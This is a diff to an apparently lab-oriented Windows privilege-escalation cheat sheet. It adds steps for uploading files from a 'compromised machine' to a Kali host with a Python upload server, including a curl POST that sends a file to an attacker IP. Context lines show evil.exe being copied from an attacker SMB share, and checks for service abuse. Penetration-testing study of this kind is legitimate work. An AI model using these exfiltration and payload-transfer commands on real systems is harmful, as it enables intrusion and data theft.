@@ -62,7 +62,32 @@ copy evil.exe from kali to your target
 copy \\<kali ip>\exfil\evil.exe evil.exe
 ```
 
+## Transferring files from Windows to Kali
 
+If you need to upload a file back to your Kali machine, you can either opt for the SMB method above or use a python [upload server](https://pypi.org/project/uploadserver/) (requires python 3.9 and above).
+It also has a GUI interface if you browse to the page
+
+Install on your Kali machine using
+```bash
+pip install uploadserver
+```
+
+Depending on how python is configured on your machine, you might need to use `python3` instead
+```bash
+python -m uploadserver
+```
+
+The default port for uploadserver is 8000, but it can be set in the same manner as http.server by indicating the port number :
+```bash
+python -m uploadserver 4444
+```
+
+Upload with curl using the compromised machine (can also be used in Linux)
+```powershell
+curl -X POST http://192.168.100.200:8000/upload -F 'files=@suspicious_file.txt'
+```
+
+The file will be uploaded to the directory where you ran the `uploadserver` module
 ## Checking for the Quick Wins
 
 Check the following:
@@ -152,11 +177,13 @@ We can use this when we can write to a service's main or subdirectory but cannot
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 # if you find any services that dont look like default services (you need to do more boxes and then you will know what is not normal)
-# check if our current user can start and stop the service
+# check if our current user can start, stop or restart the service (might still throw an error when the command works)
 
 Start-Service SusService
 
 Stop-Service SusService
+
+Restart-Service SusService
 ```
 
 Well that is about it. If there is nothing so far, it is likely to be related to services or scheduled tasks or some sensitive file buried in the filesystem which winpeas can do for you.
